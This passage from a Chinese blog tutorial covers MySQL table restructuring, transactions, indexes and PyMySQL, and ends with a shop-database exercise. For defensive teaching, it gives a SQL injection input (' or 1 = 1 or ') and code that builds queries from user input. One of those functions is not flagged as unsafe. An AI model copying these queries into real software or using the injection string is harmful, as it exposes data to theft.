id="1-4-小结"><a href="#1-4-小结" class="headerlink" title="1.4 小结"></a>1.4 小结</h4><ul><li>想要完成表复制可以使用: insert into .. select .. SQL语句</li></ul><h3 id="2-使用连接更新表中某个字段数据"><a href="#2-使用连接更新表中某个字段数据" class="headerlink" title="2.使用连接更新表中某个字段数据"></a>2.使用连接更新表中某个字段数据</h3><h4 id="2-1-更新goods表中的商品分类信息"><a href="#2-1-更新goods表中的商品分类信息" class="headerlink" title="2.1 更新goods表中的商品分类信息"></a>2.1 更新goods表中的商品分类信息</h4><p>上一节课我们已经创建了一个商品分类表(good_cates)，并完成了商品分类信息的插入，现在需要更新goods表中的商品分类信息，把商品分类名称改成商量分类id。</p><p>接下来我们实现第二步操作:</p><ul><li><strong>将goods表中的分类名称更改成商品分类表中对应的分类id</strong></li></ul><pre><code class="sql">-- 查看goods表中的商品分类名称对应的商品分类idselect * from goods inner join good_cates on goods.cate_name = good_cates.name;-- 把该语句中from 后的语句理解为一张虚表  update goods g inner join good_cates gc on g.cate_name=gc.name set g.cate_name=gc.id;</code></pre><h4 id="2-2-小结"><a href="#2-2-小结" class="headerlink" title="2.2 小结"></a>2.2 小结</h4><ul><li>连接更新表中数据使用: update .. join .. 语句</li></ul><h3 id="3-创建表并给某个字段添加数据"><a href="#3-创建表并给某个字段添加数据" class="headerlink" title="3.创建表并给某个字段添加数据"></a>3.创建表并给某个字段添加数据</h3><h4 id="3-1-思考"><a href="#3-1-思考" class="headerlink" title="3.1 思考"></a>3.1 思考</h4><p>前面我们完成了商品分类表(good_cates)的创建和商品分类信息的添加以及把商品表(goods)中的商品分类名称改成了对应的商品分类id，假如我们想要添加一个品牌，比如：双飞燕这个品牌信息，只通过goods表无法完成品牌信息的添加，那么如何实现添加品牌信息的操作?</p><p><strong>答案:</strong></p><ol><li>创建一个品牌表，把goods表中的品牌信息添加到该表中。</li><li>将goods表中的品牌名称更改成品牌表中对应的品牌id</li></ol><h4 id="3-2-创建品牌表"><a href="#3-2-创建品牌表" class="headerlink" title="3.2 创建品牌表"></a>3.2 创建品牌表</h4><pre><code class="sql">-- 查询品牌信息 select brand_name from goods group by brand_name;-- 通过create table ...select来创建数据表并且同时插入数据-- 创建商品分类表，注意: 需要对brand_name 用as起别名，否则name字段就没有值create table good_brands (     id int unsigned primary key auto_increment,     name varchar(40) not null) select brand_name as name from goods group by brand_name;</code></pre><p><strong>说明:</strong></p><ul><li>create table .. select 列名 .. 表示创建表并插入数据</li></ul><h4 id="3-3-更新goods表中的品牌信息"><a href="#3-3-更新goods表中的品牌信息" class="headerlink" title="3.3 更新goods表中的品牌信息"></a>3.3 更新goods表中的品牌信息</h4><pre><code class="sql">-- 将goods表中的品牌名称更改成品牌表中对应的品牌idupdate goods as g inner join good_brands gb on g.brand_name = gb.name set g.brand_name = gb.id;</code></pre><h4 id="3-4-小结"><a href="#3-4-小结" class="headerlink" title="3.4 小结"></a>3.4 小结</h4><ul><li>创建表并给字段插入数据使用: create table .. select 语句</li></ul><h3 id="4-修改goods表结构"><a href="#4-修改goods表结构" class="headerlink" title="4.修改goods表结构"></a>4.修改goods表结构</h3><h4 id="4-1-修改goods表结构"><a href="#4-1-修改goods表结构" class="headerlink" title="4.1 修改goods表结构"></a>4.1 修改goods表结构</h4><p>目前我们已经把good表中的商品分类和品牌信息已经更改成了商品分类id和品牌id，接下来需要把 cate_name 和 brand_name 字段分别改成 cate_id和 brand_id 字段，类型都改成int类型</p><pre><code class="sql">-- 查看表结构desc goods;-- 通过alter table语句修改表结构alter table goods change cate_name cate_id int not null, change brand_name brand_id int not null;</code></pre><p><strong>说明:</strong></p><ul><li>alert table 可以同时修改多个字段信息</li></ul><h4 id="4-2-小结"><a href="#4-2-小结" class="headerlink" title="4.2 小结"></a>4.2 小结</h4><ul><li>修改表结构可以使用: alter table 语句，多个修改字段之间使用逗号分隔</li></ul><h3 id="5-事务"><a href="#5-事务" class="headerlink" title="5.事务"></a>5.事务</h3><h4 id="5-1-事务的介绍"><a href="#5-1-事务的介绍" class="headerlink" title="5.1 事务的介绍"></a>5.1 事务的介绍</h4><p>事务就是用户定义的一系列执行SQL语句的操作, 这些操作要么完全地执行，要么完全地都不执行， 它是一个不可分割的工作执行单元。</p><p><strong>事务的使用场景:</strong></p><p>在日常生活中，有时我们需要进行银行转账，这个银行转账操作背后就是需要执行多个SQL语句，假如这些SQL执行到一半突然停电了，那么就会导致这个功能只完成了一半，这种情况是不允许出现，要想解决这个问题就需要通过事务来完成。</p><h4 id="5-2-事务的四大特性"><a href="#5-2-事务的四大特性" class="headerlink" title="5.2 事务的四大特性"></a>5.2 事务的四大特性</h4><ul><li>原子性(Atomicity)</li><li>一致性(Consistency)</li><li>隔离性(Isolation)</li><li>持久性(Durability)</li></ul><p><strong>原子性:</strong></p><p>一个事务必须被视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作，这就是事务的原子性</p><p><strong>一致性:</strong></p><p>数据库总是从一个一致性的状态转换到另一个一致性的状态。（在前面的例子中，一致性确保了，即使在转账过程中系统崩溃，支票账户中也不会损失200美元，因为事务最终没有提交，所以事务中所做的修改也不会保存到数据库中。）</p><p><strong>隔离性:</strong></p><p>通常来说，一个事务所做的修改操作在提交事务之前，对于其他事务来说是不可见的。（在前面的例子中，当执行完第三条语句、第四条语句还未开始时，此时有另外的一个账户汇总程序开始运行，则其看到支票帐户的余额并没有被减去200美元。）</p><p><strong>持久性:</strong></p><p>一旦事务提交，则其所做的修改会永久保存到数据库。</p><p><strong>说明:</strong></p><p>事务能够保证数据的完整性和一致性，让用户的操作更加安全。</p><h4 id="5-3-事务的使用"><a href="#5-3-事务的使用" class="headerlink" title="5.3 事务的使用"></a>5.3 事务的使用</h4><p>在使用事务之前，先要确保表的存储引擎是 InnoDB 类型, 只有这个类型才可以使用事务，MySQL数据库中表的存储引擎默认是 InnoDB 类型。</p><p><strong>表的存储引擎说明:</strong></p><p>表的存储引擎就是提供存储数据一种机制，不同表的存储引擎提供不同的存储机制。</p><pre><code class="sql">-- 查看MySQL数据库支持的表的存储引擎show engines;</code></pre><p><strong>说明:</strong></p><ul><li>常用的表的存储引擎是 InnoDB 和 MyISAM</li><li>InnoDB 是支持事务的</li><li>MyISAM 不支持事务，优势是访问速度快，对事务没有要求或者以select、insert为主的都可以使用该存储引擎来创建表</li></ul><p><strong>查看goods表的创表语句:</strong></p><pre><code class="sql">-- 选择数据库use jing_dong;-- 查看goods表show create table goods;mysql root@(none):jing_dong&gt; show create table goods;+-------+--------------------------------------------------------+| Table | Create Table                                           |+-------+--------------------------------------------------------+| goods | CREATE TABLE `goods` (                                 ||       |   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,       ||       |   `name` varchar(150) NOT NULL,                        ||       |   `cate_id` int(10) unsigned NOT NULL,                 ||       |   `brand_id` int(10) unsigned NOT NULL,                ||       |   `price` decimal(10,3) NOT NULL DEFAULT &#39;0.000&#39;,      ||       |   `is_show` bit(1) NOT NULL DEFAULT b&#39;1&#39;,              ||       |   `is_saleoff` bit(1) NOT NULL DEFAULT b&#39;0&#39;,           ||       |   PRIMARY KEY (`id`)                                   ||       | ) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8 |+-------+--------------------------------------------------------+</code></pre><p><strong>说明:</strong></p><ul><li>通过创表语句可以得知，goods表的存储引擎是InnoDB。</li><li>修改表的存储引擎使用: alter table 表名 engine = 引擎类型;<ul><li>比如: alter table students engine = ‘MyISAM’;</li></ul></li></ul><p><strong>开启事务:</strong></p><pre><code class="sql">begin;或者start transaction;</code></pre><p><strong>说明:</strong></p><ul><li><p><strong>开启事务后执行修改命令，变更数据会保存到MySQL服务端的缓存文件中，而不维护到物理表中</strong></p></li><li><p><strong>MySQL数据库默认采用自动提交(autocommit)模式，如果没有显示的开启一个事务,那么每条sql语句都会被当作一个事务执行提交的操作</strong></p></li><li><p>当设置autocommit=0就是取消了自动提交事务模式，直到显示的执行commit和rollback表示该事务结束。</p><ul><li>set autocommit = 0 表示取消自动提交事务模式，需要手动执行commit完成事务的提交</li></ul><pre><code class="sql">set autocommit = 0;insert into students(name) values(&#39;刘三峰&#39;);-- 需要执行手动提交，数据才会真正添加到表中, 验证的话需要重新打开一个连接窗口查看表的数据信息，因为是临时关闭自动提交模式commit-- 重新打开一个终端窗口，连接MySQL数据库服务端mysql -uroot -p-- 然后查询数据,如果上个窗口执行了commit，这个窗口才能看到数据select * from students;</code></pre><p><strong>提交事务:</strong></p><p>将本地缓存文件中的数据提交到物理表中，完成数据的更新。</p><pre><code class="sql">commit;</code></pre><p><strong>回滚事务:</strong></p><p>放弃本地缓存文件中的缓存数据, 表示回到开始事务前的状态</p><pre><code>rollback;</code></pre><p><strong>事务演练的SQL语句:</strong></p><pre><code class="sql">begin;insert into students(name) values(&#39;李白&#39;);-- 查询数据，此时有新增的数据, 注意: 如果这里后续没有执行提交事务操作，那么数据是没有真正的更新到物理表中select * from students;-- 只有这里提交事务，才把数据真正插入到物理表中commit;-- 新打开一个终端，重新连接MySQL数据库，查询students表,这时没有显示新增的数据，说明之前的事务没有提交，这就是事务的隔离性-- 一个事务所做的修改操作在提交事务之前，对于其他事务来说是不可见的select * from students;</code></pre></li></ul><h4 id="5-4-小结"><a href="#5-4-小结" class="headerlink" title="5.4 小结"></a>5.4 小结</h4><ol><li>事务的特性:<ul><li>原子性: 强调事务中的多个操作时一个整体</li><li>一致性: 强调数据库中不会保存不一致状态</li><li>隔离性: 强调数据库中事务之间相互不可见</li><li>持久性: 强调数据库能永久保存数据，一旦提交就不可撤销</li></ul></li><li><strong>MySQL数据库默认采用自动提交(autocommit)模式</strong>, 也就是说修改数据(insert、update、delete)的操作会自动的触发事务,完成事务的提交或者回滚</li><li>开启事务使用 begin 或者 start transaction;</li><li>回滚事务使用 rollback;</li><li>pymysql 里面的 conn.commit() 操作就是提交事务</li><li>pymysql 里面的 conn.rollback() 操作就是回滚事务</li></ol><h3 id="6-索引"><a href="#6-索引" class="headerlink" title="6.索引"></a>6.索引</h3><h4 id="6-1-索引的介绍"><a href="#6-1-索引的介绍" class="headerlink" title="6.1 索引的介绍"></a>6.1 索引的介绍</h4><p>索引在MySQL中也叫做“键”，它是一个特殊的文件，它保存着数据表里所有记录的位置信息，更通俗的来说，数据库索引好比是一本书前面的目录，能加快数据库的查询速度。</p><p><strong>应用场景:</strong></p><p>当数据库中数据量很大时，查找数据会变得很慢，我们就可以通过索引来提高数据库的查询效率。</p><h4 id="6-2-索引的使用"><a href="#6-2-索引的使用" class="headerlink" title="6.2 索引的使用"></a>6.2 索引的使用</h4><p><strong>查看表中已有索引:</strong></p><pre><code class="sql">show index from 表名;</code></pre><p><strong>说明:</strong></p><ul><li>主键列会自动创建索引</li></ul><p><strong>索引的创建:</strong></p><pre><code class="sql">-- 创建索引的语法格式-- alter table 表名 add index 索引名[可选](列名, ..)-- 给name字段添加索引alter table classes add index my_name (name);</code></pre><p><strong>说明:</strong></p><ul><li>索引名不指定，默认使用字段名</li></ul><p><strong>索引的删除:</strong></p><pre><code class="sql">-- 删除索引的语法格式-- alter table 表名 drop index 索引名-- 如果不知道索引名，可以查看创表sql语句show create table classes;alter table classes drop index my_name;</code></pre><h4 id="6-3-案例-验证索引查询性能"><a href="#6-3-案例-验证索引查询性能" class="headerlink" title="6.3 案例-验证索引查询性能"></a>6.3 案例-验证索引查询性能</h4><p><strong>创建测试表testindex:</strong></p><pre><code class="sql">create table test_index(title varchar(10));</code></pre><p><strong>向表中插入十万条数据:</strong></p><pre><code class="py">from pymysql import connectdef main():    # 创建Connection连接    conn = connect(host=&#39;localhost&#39;,port=3306,database=&#39;python&#39;,user=&#39;root&#39;,password=&#39;mysql&#39;,charset=&#39;utf8&#39;)    # 获得Cursor对象    cursor = conn.cursor()    # 插入10万次数据    for i in range(100000):        cursor.execute(&quot;insert into test_index values(&#39;ha-%d&#39;)&quot; % i)    # 提交数据    conn.commit()if __name__ == &quot;__main__&quot;:    main()</code></pre><p><strong>验证索引性能操作：</strong></p><pre><code class="sql">-- 开启运行时间监测：set profiling=1;-- 查找第1万条数据ha-99999select * from test_index where title=&#39;ha-99999&#39;;-- 查看执行的时间：show profiles;-- 给title字段创建索引：alter table test_index add index (title);-- 再次执行查询语句select * from test_index where title=&#39;ha-99999&#39;;-- 再次查看执行的时间show profiles;</code></pre><h4 id="6-4-联合索引"><a href="#6-4-联合索引" class="headerlink" title="6.4 联合索引"></a>6.4 联合索引</h4><p>联合索引又叫复合索引，即一个索引覆盖表中两个或者多个字段，一般用在多个字段一起查询的时候。</p><pre><code class="sql">-- 创建teacher表create table teacher(    id int not null primary key auto_increment,    name varchar(10),    age int);-- 创建联合索引alter table teacher add index (name,age);</code></pre><p><strong>联合索引的好处:</strong></p><ul><li>减少磁盘空间开销，因为每创建一个索引，其实就是创建了一个索引文件，那么会增加磁盘空间的开销。</li></ul><h4 id="6-5-联合索引的最左原则"><a href="#6-5-联合索引的最左原则" class="headerlink" title="6.5 联合索引的最左原则"></a>6.5 联合索引的最左原则</h4><p>在使用联合索引的时候，我们要遵守一个最左原则,即index(name,age)支持 name 、name 和 age 组合查询,而不支持单独 age 查询，因为没有用到创建的联合索引。</p><p><strong>最左原则示例:</strong></p><pre><code class="sql">-- 下面的查询使用到了联合索引select * from stu where name=&#39;张三&#39; -- 这里使用了联合索引的name部分select * from stu where name=&#39;李四&#39; and age=10 -- 这里完整的使用联合索引，包括 name 和 age 部分 -- 下面的查询没有使用到联合索引select * from stu where age=10 -- 因为联合索引里面没有这个组合，只有 name | name age 这两种组合</code></pre><p><strong>说明:</strong></p><ul><li>在使用联合索引的查询数据时候一定要保证联合索引的最左侧字段出现在查询条件里面，否则联合索引失效</li></ul><h4 id="6-6-MySQL中索引的优点和缺点和使用原则"><a href="#6-6-MySQL中索引的优点和缺点和使用原则" class="headerlink" title="6.6 MySQL中索引的优点和缺点和使用原则"></a>6.6 MySQL中索引的优点和缺点和使用原则</h4><ul><li>优点：<ol><li>加快数据的查询速度</li></ol></li><li>缺点：<ol><li>创建索引会耗费时间和占用磁盘空间，并且随着数据量的增加所耗费的时间也会增加</li></ol></li><li>使用原则：<ol><li>通过优缺点对比，不是索引越多越好，而是需要自己合理的使用。</li><li>对经常更新的表就避免对其进行过多索引的创建，对经常用于查询的字段应该创建索引，</li><li>数据量小的表最好不要使用索引，因为由于数据较少，可能查询全部数据花费的时间比遍历索引的时间还要短，索引就可能不会产生优化效果。</li><li>在一字段上相同值比较多不要建立索引，比如在学生表的”性别”字段上只有男，女两个不同值。相反的，在一个字段上不同值较多可是建立索引。</li></ol></li></ul><h4 id="6-7-小结"><a href="#6-7-小结" class="headerlink" title="6.7 小结"></a>6.7 小结</h4><ul><li>索引是加快数据库的查询速度的一种手段</li><li>创建索引使用: alter table 表名 add index 索引名[可选] (字段名, xxx);</li><li>删除索引使用: alter table 表名 drop index 索引名;</li></ul><h3 id="7-PyMySQL的使用"><a href="#7-PyMySQL的使用" class="headerlink" title="7.PyMySQL的使用"></a>7.PyMySQL的使用</h3><h4 id="7-1-思考"><a href="#7-1-思考" class="headerlink" title="7.1 思考"></a>7.1 思考</h4><p>如何实现将100000条数据插入到MySQL数据库?</p><p><strong>答案:</strong></p><p>如果使用之前学习的MySQL客户端来完成这个操作，那么这个工作量无疑是巨大的，我们可以通过使用程序代码的方式去连接MySQL数据库，然后对MySQL数据库进行增删改查的方式，实现10000条数据的插入，像这样使用代码的方式操作数据库就称为数据库编程。</p><h4 id="7-2-Python程序操作MySQL数据库"><a href="#7-2-Python程序操作MySQL数据库" class="headerlink" title="7.2 Python程序操作MySQL数据库"></a>7.2 Python程序操作MySQL数据库</h4><p><strong>安装pymysql第三方包:</strong></p><pre><code class="bash">sudo pip3 install pymysql</code></pre><p><strong>说明:</strong></p><ul><li>安装命令使用 sudo pip3 install 第三方包名</li><li>卸载命令使用 sudo pip3 uninstall 第三方包</li><li>大家现在使用的虚拟机已经安装了这个第三方包，可以使用： <strong>pip3 show pymysql</strong> 命令查看第三方包的信息</li><li><strong>pip3 list</strong> 查看使用pip命令安装的第三方包列表</li></ul><p><strong>pymysql的使用:</strong></p><ol><li><p>导入 pymysql 包</p><pre><code class="python"> import pymysql</code></pre></li><li><p>创建连接对象</p><p>调用pymysql模块中的connect()函数来创建连接对象,代码如下:</p><pre><code class="py"> conn=connect(参数列表) * 参数host：连接的mysql主机，如果本机是&#39;localhost&#39; * 参数port：连接的mysql主机的端口，默认是3306 * 参数user：连接的用户名 * 参数password：连接的密码 * 参数database：数据库的名称 * 参数charset：通信采用的编码方式，推荐使用utf8</code></pre><p><strong>连接对象操作说明:</strong></p><ul><li>关闭连接 conn.close()</li><li>提交数据 conn.commit()</li><li>撤销数据 conn.rollback()</li></ul></li><li><p>获取游标对象</p><p>获取游标对象的目标就是要执行sql语句，完成对数据库的增、删、改、查操作。代码如下:</p><pre><code class="py"> # 调用连接对象的cursor()方法获取游标对象    cur =conn.cursor()</code></pre><p><strong>游标操作说明:</strong></p><ul><li>使用游标执行SQL语句: execute(operation [parameters ]) 执行SQL语句，返回受影响的行数，主要用于执行insert、update、delete、select等语句</li><li>获取查询结果集中的一条数据:cur.fetchone()返回一个元组, 如 (1,’张三’)</li><li>获取查询结果集中的所有数据: cur.fetchall()返回一个元组,如((1,’张三’),(2,’李四’))</li><li>关闭游标: cur.close(),表示和数据库操作完成</li></ul></li><li><p>pymysql完成数据的查询操作</p><pre><code class="python">import pymysql# 创建连接对象conn = pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, password=&#39;mysql&#39;,database=&#39;python&#39;, charset=&#39;utf8&#39;)# 获取游标对象cursor = conn.cursor()# 查询 SQL 语句sql = &quot;select * from students;&quot;# 执行 SQL 语句 返回值就是 SQL 语句在执行过程中影响的行数row_count = cursor.execute(sql)print(&quot;SQL 语句执行影响的行数%d&quot; % row_count)# 取出结果集中一行数据,　例如:(1, &#39;张三&#39;)# print(cursor.fetchone())# 取出结果集中的所有数据, 例如:((1, &#39;张三&#39;), (2, &#39;李四&#39;), (3, &#39;王五&#39;))for line in cursor.fetchall():    print(line)# 关闭游标cursor.close()# 关闭连接conn.close()</code></pre></li><li><p>pymysql完成对数据的增删改</p><pre><code class="python">import pymysql# 创建连接对象conn = pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, password=&#39;mysql&#39;,database=&#39;python&#39;, charset=&#39;utf8&#39;)# 获取游标对象cursor = conn.cursor()try:    # 添加 SQL 语句    # sql = &quot;insert into students(name) values(&#39;刘璐&#39;), (&#39;王美丽&#39;);&quot;    # 删除 SQ L语句    # sql = &quot;delete from students where id = 5;&quot;    # 修改 SQL 语句    sql = &quot;update students set name = &#39;王铁蛋&#39; where id = 6;&quot;    # 执行 SQL 语句    row_count = cursor.execute(sql)    print(&quot;SQL 语句执行影响的行数%d&quot; % row_count)    # 提交数据到数据库    conn.commit()except Exception as e:    # 回滚数据， 即撤销刚刚的SQL语句操作    conn.rollback()# 关闭游标cursor.close()# 关闭连接conn.close()</code></pre><p><strong>说明:</strong></p><ul><li>conn.commit() 表示将修改操作提交到数据库</li><li>conn.rollback() 表示回滚数据</li></ul></li><li><p>防止SQL注入</p><p>什么是SQL注入?</p><p>用户提交带有恶意的数据与SQL语句进行字符串方式的拼接，从而影响了SQL语句的语义，最终产生数据泄露的现象。</p><p>如何防止SQL注入?</p><p>SQL语句参数化</p><ul><li>SQL语言中的参数使用%s来占位，此处不是python中的字符串格式化操作</li><li>将SQL语句中%s占位所需要的参数存在一个列表中，把参数列表传递给execute方法中第二个参数</li></ul><p><strong>防止SQL注入的示例代码:</strong></p><pre><code class="python">from pymysql import connectdef main():    find_name = input(&quot;请输入物品名称：&quot;)    # 创建Connection连接    conn = connect(host=&#39;localhost&#39;,port=3306,user=&#39;root&#39;,password=&#39;mysql&#39;,database=&#39;jing_dong&#39;,charset=&#39;utf8&#39;)    # 获得Cursor对象    cs1 = conn.cursor()    # 非安全的方式    # 输入 &#39; or 1 = 1 or &#39;   (单引号也要输入)    # sql = &quot;select * from goods where name=&#39;%s&#39;&quot; % find_name    # print(&quot;&quot;&quot;sql===&gt;%s&lt;====&quot;&quot;&quot; % sql)    # # 执行select语句，并返回受影响的行数：查询所有数据    # count = cs1.execute(sql)    # 安全的方式    # 构造参数列表    params = [find_name]    # 执行select语句，并返回受影响的行数：查询所有数据    count = cs1.execute(&quot;select * from goods where name=%s&quot;, params)    # 注意：    # 如果要是有多个参数，需要进行参数化    # 那么params = [数值1, 数值2....]，此时sql语句中有多个%s即可    # %s 不需要带引号    # 打印受影响的行数    print(count)    # 获取查询的结果    # result = cs1.fetchone()    result = cs1.fetchall()    # 打印查询的结果    print(result)    # 关闭Cursor对象    cs1.close()    # 关闭Connection对象    conn.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><p><strong>说明:</strong></p><ul><li>execute方法中的 %s 占位不需要带引号</li></ul></li></ol><h4 id="7-3-小结-1"><a href="#7-3-小结-1" class="headerlink" title="7.3 小结"></a>7.3 小结</h4><ol><li><p>导包</p><pre><code class="py"> import pymysql</code></pre></li><li><p>创建连接对象</p><pre><code class="py"> pymysql.connect(参数列表)</code></pre></li><li><p>获取游标对象</p><pre><code class="py"> cursor =conn.cursor()</code></pre></li><li><p>执行SQL语句</p><pre><code class="py"> row_count = cursor.execute(sql)</code></pre></li><li><p>获取查询结果集</p><pre><code class="py"> result = cursor.fetchall()</code></pre></li><li><p>将修改操作提交到数据库</p><pre><code class="py"> conn.commit()</code></pre></li><li><p>回滚数据</p><pre><code class="py"> conn.rollback()</code></pre></li><li><p>关闭游标</p><pre><code class="py"> cursor.close()</code></pre></li><li><p>关闭连接</p><pre><code class="py"> conn.close()</code></pre></li></ol><h3 id="8-京东数据库案例练习"><a href="#8-京东数据库案例练习" class="headerlink" title="8.京东数据库案例练习"></a>8.京东数据库案例练习</h3><p>一. 准备数据</p><p>该案例使用前面章节中完成的京东商品数据库.</p><p>二. 程序菜单</p><pre><code class="python">    print(&#39;1. 查询所有商品信息&#39;)    print(&quot;2. 查询所有包含商品的分类&quot;)    print(&quot;3. 添加新商品分类&quot;)    print(&quot;4. 将所有商品价格加1000&quot;)    print(&quot;5. 将所有笔记本的分类改为超级本&quot;)    print(&quot;6. 根据id查询商品信息&quot;)    print(&quot;7. 根据id查询商品信息安全方式&quot;)    print(&quot;8. 退出系统&quot;)</code></pre><p>三. 方法命名</p><pre><code class="python">    # 显示菜单方法    def __print_menu(self):        pass    # 打印结果方法    def __show_query_result(self, result):        pass    # 服务器运行方法,实现主体逻辑    def run(self):        pass    # 1. 查询所有商品信息    def __fetch_all_info(self):        pass   # 2. 查询所有包含商品的分类    def __fetch_cate_of_goods(self):        pass    # 3. 添加商品分类    def __add_new_cate(self):        pass      # 4. 将所有商品价格加1000    def __update_price(self):        pass    # 5. 将所有笔记本的分类改为超级本    def __update_cate(self):        pass    # 6. 根据id查询商品信息    def __fetch_info_with_id(self):        pass    # 7. 根据id查询商品信息安全方式    def __fetch_info_with_id_safe(self):        pass</code></pre><p>四. 代码实现</p><ol><li><p>判断当前是否是主程序入口</p><pre><code class="python"> if __name__ == &#39;__main__&#39;:     main()</code></pre></li><li><p>实现主函数</p><pre><code class="python"> def main():     # 创建服务器对象,并传入相应参数     jd = JDServer(&#39;jd&#39;, &#39;root&#39;, &#39;123123&#39;)     # 启动服务器     jd.run()</code></pre></li><li><p>实现 JD 类</p><pre><code class="python"> import pymysql class JDServer(object): &quot;&quot;&quot;JD 类，提供商品查询服务&quot;&quot;&quot; # 将数据库连接操作放到初化方法中，对象创建时，自动连接数据库 def __init__(self, target_db, username, password):     # 连接数据库     self.db_connect = pymysql.Connect(host=&#39;localhost&#39;,port=3306,database=target_db, user=username, passwd=password, charset=&#39;utf8&#39;) # 将数据库关闭操作放到 __del__方法中，当对象销毁时，自动关闭数据库 def __del__(self):     # 关闭数据库     self.db_connect.close()</code></pre></li><li><p>实现 run 方法 因为需要重复选择，所以要用死循环</p><pre><code class="python"> # 服务器运行方法,实现主体逻辑,通过判断输入选择相应的功能函数 def run(self):     while True:         self.__print_menu()         select_id = input(&#39;请输入功能ID:&#39;)         if select_id == &#39;1&#39;:             self.__fetch_all_info()         elif select_id == &#39;2&#39;:             self.__fetch_cate_of_goods()         elif select_id == &#39;3&#39;:             self.__add_new_cate()         elif select_id == &#39;4&#39;:             self.__update_price()         elif select_id == &#39;5&#39;:             self.__update_cate()         elif select_id == &#39;6&#39;:             self.__fetch_info_with_id()         elif select_id == &#39;7&#39;:             self.__fetch_info_with_id_safe()         elif select_id == &#39;8&#39;:             break         else:             print(&#39;输入功能不正确,请重新输入&#39;)</code></pre></li><li><p>实现一个显示方法，用来输出结果</p><pre><code class="python"> # 用来显示结果的方法，私有，对外不可见 def __show_query_result(self, result):     for item in result:         print(item)</code></pre></li><li><p>实现查询所有商品信息</p><pre><code class="python"> # 1. 查询所有商品信息 def __fetch_all_info(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39;select * from goods&#39;&#39;&#39;     cur.execute(sql_str)     result = cur.fetchall()     self.__show_query_result(result)     cur.close()</code></pre></li><li><p>查询所有包含商品的分类</p><pre><code class="python"> # 2. 查询所有包含商品的分类 def __fetch_cate_of_goods(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39;select distinct good_cates.name from goods inner join good_cates on goods.cate_id = good_cates.id;&#39;&#39;&#39;     # sql_str = &#39;&#39;&#39; select name from good_cates where id in (select distinct cate_id from goods); &#39;&#39;&#39;     cur.execute(sql_str)     result = cur.fetchall()     self.__show_query_result(result)     cur.close()</code></pre></li><li><p>添加商品分类</p><pre><code class="python"> # 3. 添加商品分类 def __add_new_cate(self):     new_cate = input(&#39;请输入一个新商品分类:&#39;)     sql_str = &#39;&#39;&#39; insert into good_cates(name) values(&quot;%s&quot;) &#39;&#39;&#39; % new_cate     cur = self.db_connect.cursor()     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有商品价格加1000</p><pre><code class="python"> # 4. 将所有商品价格加1000 def __update_price(self):     cur = self.db_connect.cursor()     sql_str = &#39;&#39;&#39; update goods set price = price + 1000&#39;&#39;&#39;     cur.execute(sql_str)     self.db_connect.commit()     cur.close()</code></pre></li><li><p>将所有笔记本的分类改为超级本</p><pre><code class="python"># 5. 将所有笔记本的分类改为超级本def __update_cate(self):    cur = self.db_connect.cursor()    sql_str = &#39;&#39;&#39;update goods set cate_id = (select id from good_cates where name = &#39;超级本&#39;) where name like &#39;%笔记本%&#39;;&#39;&#39;&#39;    cur.execute(sql_str)    self.db_connect.commit()    cur.close()</code></pre></li><li><p>根据id 查找商品,会产生SQL注入问题</p><pre><code class="python"># 6. 根据id查询商品信息def __fetch_info_with_id(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39; % s_id    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str)    result = cur.fetchall()    self.__show_query_result(result)    cur.close()</code></pre></li><li><p>根据id查询商品信息安全方式,案例防注入</p><pre><code class="python"># 7. 根据id查询商品信息安全方式def __fetch_info_with_id_safe(self):    s_id = input(&#39;请输入一个商品ID:&#39;)    sql_str = &#39;&#39;&#39; select * from goods where id = %s &#39;&#39;&#39;    print(sql_str)    cur = self.db_connect.cursor()    cur.execute(sql_str, (s_id,))    result = cur.fetchall()    self.__show_query_result(result)    cur.close()</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级02-多任务编程</title>
      <link href="/2020/08/05/2020-08-06-python%E9%AB%98%E7%BA%A702-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/08/05/2020-08-06-python%E9%AB%98%E7%BA%A702-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="第2节：多任务编程"><a href="#第2节：多任务编程" class="headerlink" title="第2节：多任务编程"></a>第2节：多任务编程</h3><h4 id="1-多任务介绍"><a href="#1-多任务介绍" class="headerlink" title="1. 多任务介绍"></a>1. 多任务介绍</h4><h5 id="1-1-多任务的概念"><a href="#1-1-多任务的概念" class="headerlink" title="1.1 多任务的概念"></a>1.1 多任务的概念</h5><a id="more"></a><p>多任务是指在<strong>同一时间内</strong>执行<strong>多个任务</strong>，例如: 现在电脑安装的操作系统都是多任务操作系统，可以同时运行着多个软件。</p><h5 id="1-2-多任务的执行方式"><a href="#1-2-多任务的执行方式" class="headerlink" title="1.2 多任务的执行方式"></a>1.2 多任务的执行方式</h5><ul><li>并发</li><li>并行</li></ul><p><strong>并发:</strong></p><p>在一段时间内<strong>交替</strong>去执行任务。</p><p><strong>例如:</strong></p><p>对于单核cpu处理多任务,操作系统轮流<strong>让各个软件交替执行</strong>，假如:软件1执行0.01秒，切换到软件2，软件2执行0.01秒，再切换到软件3，执行0.01秒……这样反复执行下去。表面上看，每个软件都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像这些软件都在同时执行一样，这里需要注意单核cpu是并发的执行多任务的。</p><p><strong>并行:</strong></p><p>对于多核cpu处理多任务，操作系统会给cpu的每个内核安排一个执行的软件，<strong>多个内核是真正的一起执行软件</strong>。这里需要注意<strong>多核cpu是并行的执行多任务，始终有多个软件一起执行</strong>。</p><h4 id="2-进程的使用"><a href="#2-进程的使用" class="headerlink" 